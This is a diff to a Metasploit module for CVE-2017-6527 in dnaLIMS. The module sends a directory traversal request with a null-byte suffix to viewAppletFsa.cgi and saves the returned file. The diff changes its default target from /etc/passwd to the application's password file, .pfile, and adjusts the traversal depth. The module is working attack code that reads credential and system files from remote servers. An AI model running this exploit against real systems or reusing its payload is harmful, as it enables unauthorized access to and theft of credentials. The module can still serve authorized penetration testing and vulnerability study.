@@ -1,5 +1,3 @@
-
-
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,8 +5,7 @@
 
 require 'msf/core'
 
-class MetasploitModule < Msf::Exploit::Remote
-  Rank = ExcellentRanking
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -24,14 +21,14 @@ class MetasploitModule < Msf::Exploit::Remote
       },
       'References'     =>
         [
-          ['CVE', '2017-6527']
-          ['US-CERT-VU', '929263']
+          ['CVE', '2017-6527'],
+          ['US-CERT-VU', '929263'],
           ['URL', 'https://www.shorebreaksecurity.com/blog/product-security-advisory-psa0002-dnalims/']
         ],
       'Author'         =>
         [
-          'h00die',    # Discovery, PoC
-          'flakey_biscuit'  # Discovery, PoC
+          'h00die <mike@shorebreaksecurity.com>',    # Discovery, PoC
+          'flakey_biscuit <nicholas@shorebreaksecurity.com>'  # Discovery, PoC
         ],
       'License'        => MSF_LICENSE,
       'DisclosureDate' => "Mar 8 2017"
@@ -40,8 +37,8 @@ class MetasploitModule < Msf::Exploit::Remote
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The base path to dnaLIMS', '/cgi-bin/dna/']),
-        OptString.new('FILE', [ true,  "The path to the file to view", '/etc/passwd']),
-        OptInt.new('DEPTH', [true, 'The max traversal depth', 11])
+        OptString.new('FILE', [ true,  "The path to the file to view", '/home/dna/spool/.pfile']), # password db for app
+        OptInt.new('DEPTH', [true, 'The traversal depth', 4])
       ], self.class)
 
     deregister_options('RHOST')
@@ -57,7 +54,7 @@ class MetasploitModule < Msf::Exploit::Remote
     print_status("Requesting: #{file} - #{rhost}")
     res = send_request_cgi({
       'uri'      => "#{base}/viewAppletFsa.cgi",
-      'vars_get' => { 'secID' => "#{traverse}#{file}",
+      'vars_get' => { 'secID' => "#{traverse}#{file}%00",
                      'Action' => 'blast',
                     'hidenav' => '1'
       }
@@ -68,14 +65,13 @@ class MetasploitModule < Msf::Exploit::Remote
       return
     end
 
-
     if res.code != 200
       print_error("Server returned a non-200 response (body will not be saved):")
       print_line(res.to_s)
       return
     end
 
-    vprint_line(res.body)
+    vprint_good(res.body)
     p = store_loot('dnaLIMS.traversal.file', 'application/octet-stream', ip, res.body, File.basename(file))
     print_good("File saved as: #{p}")
   end
